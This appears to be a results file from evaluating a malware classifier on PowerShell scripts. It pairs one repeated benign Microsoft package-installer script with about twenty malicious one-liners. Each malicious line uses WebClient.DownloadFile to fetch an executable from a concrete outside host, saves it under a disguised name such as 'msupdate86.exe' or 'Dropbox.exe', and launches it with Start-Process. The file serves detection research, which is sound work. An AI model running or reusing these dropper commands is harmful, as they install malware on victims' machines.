@@ -1,0 +1,3695 @@
+filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,correct,predicted_label,logit_diff
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",3,benign,DownloadFile,True,benign,-1.453125
+1611.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,152,152,False,"(New-Object System.Net.WebClient).DownloadFile('http://www.fluidsystems.ml/P1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")",3,malicious,DownloadFile,True,malicious,1.453125
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",4,benign,DownloadFile,True,benign,-1.453125
+4030.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,152,152,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.106.122.64/update.exe',""$env:TEMP\msupdate86.exe"");Start-Process (""$env:TEMP\msupdate86.exe"")",4,malicious,DownloadFile,True,malicious,5.171875
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",5,benign,DownloadFile,True,benign,-1.453125
+1011.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,151,151,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.117.75.43/update.exe',""$env:TEMP\update1x86.exe"");Start-Process (""$env:TEMP\update1x86.exe"")",5,malicious,DownloadFile,True,malicious,4.703125
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",6,benign,DownloadFile,True,benign,-1.453125
+2833.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,151,151,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.117.75.43/update.exe',""$env:TEMP\update1x86.exe"");Start-Process (""$env:TEMP\update1x86.exe"")",6,malicious,DownloadFile,True,malicious,4.703125
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",7,benign,DownloadFile,True,benign,-1.453125
+3414.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,151,151,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.117.75.43/update.exe',""$env:TEMP\update1x86.exe"");Start-Process (""$env:TEMP\update1x86.exe"")",7,malicious,DownloadFile,True,malicious,4.703125
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",8,benign,DownloadFile,True,benign,-1.453125
+1515.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.45.193.17/update.exe',""$env:TEMP\updatex86.exe"");Start-Process (""$env:TEMP\updatex86.exe"")",8,malicious,DownloadFile,True,malicious,6.453125
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",9,benign,DownloadFile,True,benign,-1.453125
+1839.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',""$env:TEMP\filex8611.exe"");Start-Process (""$env:TEMP\filex8611.exe"")",9,malicious,DownloadFile,True,malicious,5.8125
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",10,benign,DownloadFile,True,benign,-1.453125
+1931.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',""$env:TEMP\filex8611.exe"");Start-Process (""$env:TEMP\filex8611.exe"")",10,malicious,DownloadFile,True,malicious,5.8125
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",11,benign,DownloadFile,True,benign,-1.453125
+3671.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,149,149,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',""$env:TEMP\filex8611.exe"");Start-Process (""$env:TEMP\filex8611.exe"")",11,malicious,DownloadFile,True,malicious,5.8125
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",12,benign,DownloadFile,True,benign,-1.453125
+2227.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,147,147,False,"(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.28/update.exe',""$env:TEMP\file2x86.exe"");Start-Process (""$env:TEMP\file2x86.exe"")",12,malicious,DownloadFile,True,malicious,6.90625
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",13,benign,DownloadFile,True,benign,-1.453125
+3545.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,146,146,False,"(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/spe/spendy.exe',""$env:TEMP\spendy.exe"");Start-Process (""$env:TEMP\spendy.exe"")",13,malicious,DownloadFile,True,malicious,4.40625
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",14,benign,DownloadFile,True,benign,-1.453125
+1946.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,144,144,False,"(New-Object System.Net.WebClient).DownloadFile('http://www.telemedia.co.za/wp-content/ozone/slim.exe','fleeble.exe');Start-Process 'fleeble.exe'",14,malicious,DownloadFile,True,malicious,5.5
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",15,benign,DownloadFile,True,benign,-1.453125
+3426.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,143,143,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',""$env:TEMP\Dropbox.exe"");Start-Process (""$env:TEMP\Dropbox.exe"")",15,malicious,DownloadFile,True,malicious,1.75
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",16,benign,DownloadFile,True,benign,-1.453125
+1693.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/xsakpo.exe',""$env:TEMP\euioko.exe"");Start-Process (""$env:TEMP\euioko.exe"")",16,malicious,DownloadFile,True,malicious,7.484375
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",17,benign,DownloadFile,True,benign,-1.453125
+179.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/i1/iz_001.exe',""$env:TEMP\iz_001.exe"");Start-Process (""$env:TEMP\iz_001.exe"")",17,malicious,DownloadFile,True,malicious,5.9375
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",18,benign,DownloadFile,True,benign,-1.453125
+2294.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/hsmqrh.exe',""$env:TEMP\winreg.exe"");Start-Process (""$env:TEMP\winreg.exe"")",18,malicious,DownloadFile,True,malicious,5.3125
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",19,benign,DownloadFile,True,benign,-1.453125
+2713.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/b1/bo_001.exe',""$env:TEMP\bo_001.exe"");Start-Process (""$env:TEMP\bo_001.exe"")",19,malicious,DownloadFile,True,malicious,3.34375
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",20,benign,DownloadFile,True,benign,-1.453125
+2920.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,141,141,False,"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',""$env:TEMP\Pa_001.exe"");Start-Process (""$env:TEMP\Pa_001.exe"")",20,malicious,DownloadFile,True,malicious,2.46875
+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",21,benign,DownloadFile,True,benign,-1.453125
+1399.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,140,140,False,"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.amspeconline.com/123/nana.exe', $dpl);Start-Process $dpl",21,malicious,DownloadFile,True,malicious,7.5
